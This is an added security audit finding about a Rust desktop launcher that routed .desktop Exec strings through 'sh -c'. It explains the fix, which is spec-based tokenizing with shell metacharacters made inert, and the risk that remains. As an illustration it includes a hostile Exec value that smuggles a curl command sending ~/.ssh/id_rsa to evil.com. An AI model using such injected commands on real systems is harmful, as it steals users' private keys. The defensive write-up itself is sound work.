@@ -1,0 +1,27 @@
+39 MED .desktop Exec routed through sh -c
+
+   file: src/overlays/launcher.rs::launch
+
+   why:  Command::new("systemd-run").args([..., "sh", "-c", exec]) — the
+         .desktop Exec string was passed to a shell. A hostile .desktop
+         in ~/.local/share/applications/ (flatpak/snap exports, synced
+         dotfiles, any package install) with
+           Exec=firefox --new-window; curl evil.com/x -d "$(cat ~/.ssh/id_rsa)"
+         becomes real RCE on click. A DE without shell routing (per
+         .desktop spec) would exec `firefox` with `--new-window;` as a
+         literal arg — the curl never runs.
+
+   fix:  parse_exec() tokenizes per .desktop spec (whitespace, single /
+         double quotes, backslash escape, balanced-quote validation).
+         systemd-run invoked as [..., "--", prog, args...] — shell
+         metachars are inert args, not commands. Unparseable Exec is
+         refused with a log line, not silently exec'd.
+
+   also: strip_field_codes() replaces split('%').next(), which lost
+         every char after the first % (breaking `Exec=app %f --flag`).
+         %-codes dropped per spec; %% → literal %.
+
+   residual:  A hostile Exec using only the intended program with
+              attacker-chosen flags (e.g. `Exec=code --command evil`)
+              still runs. That is .desktop-spec behavior — user is
+              responsible for the app they launch.
